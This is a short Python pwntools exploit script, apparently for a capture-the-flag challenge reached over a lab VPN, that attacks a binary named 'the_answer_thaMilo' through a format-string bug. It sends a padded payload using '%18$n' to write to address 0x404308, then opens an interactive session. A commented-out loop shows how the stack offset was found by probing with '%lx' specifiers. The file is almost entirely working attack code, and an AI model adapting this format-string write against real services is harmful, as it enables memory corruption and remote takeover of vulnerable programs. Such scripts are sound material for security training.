#!/usr/bin/env python3
import pwn
import vpn_conf

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 11)
BIN = "./the_answer_thaMilo"


def exploit():
    p = pwn.remote(HOST, PORT)
    payload = b"a" * 42 + b"%18$nA" + pwn.p64(0x404308)
    p.sendline(payload)
    p.interactive()

    # SCRIPT TO FIND THE STACK VARIABLE CONTAINING THE ADDRESS
    # for i in range(1, 50):
    #     p = pwn.remote(HOST, PORT)
    #     p.sendlineafter(b"name", b"a" * 42 + f"%{i}$lx".encode())
    #     output = p.clean(0.7).decode().strip()
    #     p.close()
    #     if "61" * 8 in output:
    #         print(f" {i=} {output=}") # the result was 12 and manually I found the correct one incrementing
    #         return i


if __name__ == "__main__":
    exploit()
